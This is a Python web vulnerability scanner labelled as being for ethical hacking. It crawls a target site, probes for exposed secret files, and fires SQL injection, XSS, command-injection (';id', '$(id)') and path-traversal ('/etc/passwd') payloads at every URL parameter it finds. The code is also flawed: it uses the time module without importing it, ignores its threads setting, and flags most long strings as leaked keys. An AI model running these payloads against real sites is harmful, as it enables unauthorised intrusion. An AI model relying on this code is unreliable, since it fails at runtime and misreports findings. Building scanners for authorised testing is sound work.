#!/usr/bin/env python3
"""
Advanced Web Vulnerability Scanner
Designed for ethical hacking and penetration testing
"""

import requests
import urllib3
import sys
import argparse
import threading
from urllib.parse import urljoin, urlparse
from bs4 import BeautifulSoup

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WebVulnerabilityScanner:
    def __init__(self, target, depth=2, threads=10):
        self.target = target
        self.depth = depth
        self.threads = threads
        self.session = requests.Session()
        self.session.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        }
        self.visited_urls = set()
        self.vulnerabilities = []
        self.sensitive_files = []
        
        # Common patterns for sensitive files
        self.sensitive_patterns = [
            '.env', 'config.php', 'config.inc.php', 'web.config', 
            '.htpasswd', '.htaccess', 'robots.txt', 'sitemap.xml',
            'backup.zip', 'dump.sql', 'database.sql'
        ]
        
        # Common patterns for sensitive information
        self.info_patterns = {
            'api_key': r'[a-zA-Z0-9]{32}',
            'api_secret': r'[a-zA-Z0-9]{40}',
            'jwt_token': r'eyJhbGciOiJ[^"]+',
            'email': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'aws_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret': r'[a-zA-Z0-9/+]{40}',
            'private_key': r'-----BEGIN PRIVATE KEY-----'
        }
    
    def crawl(self, url=None, current_depth=0):
        """Crawl the website to discover pages"""
        if current_depth > self.depth:
            return
        
        if url is None:
            url = self.target
        
        if url in self.visited_urls:
            return
        
        self.visited_urls.add(url)
        print(f"[*] Crawling: {url}")
        
        try:
            response = self.session.get(url, timeout=10, verify=False)
            
            # Check for sensitive files
            self.check_sensitive_files(url)
            
            # Check for sensitive information
            self.check_sensitive_info(response.text, url)
            
            # Parse HTML for links
            if 'text/html' in response.headers.get('Content-Type', ''):
                soup = BeautifulSoup(response.text, 'html.parser')
                
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    full_url = urljoin(url, href)
                    
                    # Only follow links within the same domain
                    if urlparse(full_url).netloc == urlparse(self.target).netloc:
                        self.crawl(full_url, current_depth + 1)
                        
        except requests.RequestException as e:
            print(f"[-] Error crawling {url}: {e}")
    
    def check_sensitive_files(self, url):
        """Check for sensitive files"""
        for pattern in self.sensitive_patterns:
            test_url = urljoin(url, pattern)
            
            try:
                response = self.session.head(test_url, timeout=5, verify=False)
                if response.status_code == 200:
                    self.sensitive_files.append(test_url)
                    print(f"[!] Sensitive file found: {test_url}")
            except:
                pass
    
    def check_sensitive_info(self, text, url):
        """Check for sensitive information in page content"""
        for info_type, pattern in self.info_patterns.items():
            import re
            matches = re.findall(pattern, text)
            if matches:
                for match in matches:
                    self.vulnerabilities.append({
                        'type': 'Information Disclosure',
                        'severity': 'High',
                        'url': url,
                        'details': f'{info_type} exposed: {match[:20]}...'
                    })
                    print(f"[!] {info_type} exposed on {url}")
    
    def check_sql_injection(self, url):
        """Check for SQL injection vulnerabilities"""
        # Parse URL parameters
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        test_payloads = [
            "'",
            "';",
            "' OR '1'='1",
            "' OR 1=1--",
            "') OR ('1'='1",
            "UNION SELECT NULL--"
        ]
        
        for param in params:
            for payload in test_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                # Rebuild URL with test parameter
                from urllib.parse import urlencode
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check for SQL error messages
                    error_indicators = [
                        'sql syntax', 'mysql_fetch', 'ora-01756', 
                        'postgresql', 'microsoft odbc', 'odbc driver',
                        'syntax error', 'mysql error', 'warning: mysql'
                    ]
                    
                    if any(indicator in response.text.lower() for indicator in error_indicators):
                        self.vulnerabilities.append({
                            'type': 'SQL Injection',
                            'severity': 'High',
                            'url': test_url,
                            'details': f'Parameter: {param}, Payload: {payload}'
                        })
                        print(f"[!] SQL Injection vulnerability found: {test_url}")
                        return True
                        
                except requests.RequestException:
                    pass
        
        return False
    
    def check_xss(self, url):
        """Check for Cross-Site Scripting vulnerabilities"""
        # Parse URL parameters
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        test_payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            'javascript:alert("XSS")',
            '" onmouseover="alert(\'XSS\')"',
            '<img src=x onerror=alert("XSS")>'
        ]
        
        for param in params:
            for payload in test_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                # Rebuild URL with test parameter
                from urllib.parse import urlencode
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check if payload is reflected in response
                    if payload in response.text:
                        self.vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)',
                            'severity': 'Medium',
                            'url': test_url,
                            'details': f'Parameter: {param}, Payload: {payload}'
                        })
                        print(f"[!] XSS vulnerability found: {test_url}")
                        return True
                        
                except requests.RequestException:
                    pass
        
        return False
    
    def check_command_injection(self, url):
        """Check for command injection vulnerabilities"""
        # Parse URL parameters
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        test_payloads = [
            ';id',
            '|id',
            '&&id',
            '||id',
            '`id`',
            '$(id)'
        ]
        
        for param in params:
            for payload in test_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                # Rebuild URL with test parameter
                from urllib.parse import urlencode
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check for command output indicators
                    output_indicators = [
                        'uid=', 'gid=', 'groups=', 'root',
                        'www-data', 'daemon', 'bin'
                    ]
                    
                    if any(indicator in response.text for indicator in output_indicators):
                        self.vulnerabilities.append({
                            'type': 'Command Injection',
                            'severity': 'High',
                            'url': test_url,
                            'details': f'Parameter: {param}, Payload: {payload}'
                        })
                        print(f"[!] Command Injection vulnerability found: {test_url}")
                        return True
                        
                except requests.RequestException:
                    pass
        
        return False
    
    def check_directory_traversal(self, url):
        """Check for directory traversal vulnerabilities"""
        # Parse URL parameters
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        test_payloads = [
            '../../../../etc/passwd',
            '..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd'
        ]
        
        for param in params:
            for payload in test_payloads:
                test_params = params.copy()
                test_params[param] = payload
                
                # Rebuild URL with test parameter
                from urllib.parse import urlencode
                test_query = urlencode(test_params, doseq=True)
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                
                try:
                    response = self.session.get(test_url, timeout=10, verify=False)
                    
                    # Check for common file contents
                    file_indicators = [
                        'root:x:0:0', 'Administrator:', '127.0.0.1',
                        'localhost', 'Microsoft Corp'
                    ]
                    
                    if any(indicator in response.text for indicator in file_indicators):
                        self.vulnerabilities.append({
                            'type': 'Directory Traversal',
                            'severity': 'High',
                            'url': test_url,
                            'details': f'Parameter: {param}, Payload: {payload}'
                        })
                        print(f"[!] Directory Traversal vulnerability found: {test_url}")
                        return True
                        
                except requests.RequestException:
                    pass
        
        return False
    
    def scan(self):
        """Main scan method"""
        print(f"[*] Starting web vulnerability scan against {self.target}")
        print(f"[*] Crawl depth: {self.depth}")
        print(f"[*] Threads: {self.threads}")
        print("=" * 50)
        
        # Start crawling
        self.crawl()
        
        # Test each discovered URL for vulnerabilities
        for url in list(self.visited_urls):
            print(f"[*] Testing {url}")
            
            # Check for SQL injection
            self.check_sql_injection(url)
            
            # Check for XSS
            self.check_xss(url)
            
            # Check for command injection
            self.check_command_injection(url)
            
            # Check for directory traversal
            self.check_directory_traversal(url)
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate a comprehensive scan report"""
        print("\n" + "=" * 60)
        print("WEB VULNERABILITY SCAN REPORT")
        print("=" * 60)
        print(f"Target: {self.target}")
        print(f"Scan date: {time.strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"Pages crawled: {len(self.visited_urls)}")
        
        print("\nVULNERABILITIES FOUND:")
        print("-" * 40)
        if not self.vulnerabilities:
            print("No vulnerabilities found.")
        else:
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{i}. [{vuln['severity']}] {vuln['type']}")
                print(f"   URL: {vuln['url']}")
                print(f"   Details: {vuln['details']}")
        
        print("\nSENSITIVE FILES FOUND:")
        print("-" * 40)
        if not self.sensitive_files:
            print("No sensitive files found.")
        else:
            for i, file in enumerate(self.sensitive_files, 1):
                print(f"{i}. {file}")
        
        # Save report to file
        import json
        report = {
            'target': self.target,
            'scan_date': time.strftime('%Y-%m-%d %H:%M:%S'),
            'vulnerabilities': self.vulnerabilities,
            'sensitive_files': self.sensitive_files,
            'crawled_urls': list(self.visited_urls)
        }
        
        report_file = f"web_scan_{urlparse(self.target).netloc}_{int(time.time())}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
        
        print(f"\nReport saved to: {report_file}")

def main():
    parser = argparse.ArgumentParser(description='Advanced Web Vulnerability Scanner')
    parser.add_argument('target', help='Target URL (e.g., http://example.com)')
    parser.add_argument('-d', '--depth', type=int, default=2, help='Crawl depth (default: 2)')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    
    args = parser.parse_args()
    
    scanner = WebVulnerabilityScanner(args.target, args.depth, args.threads)
    scanner.scan()

if __name__ == "__main__":
    main()
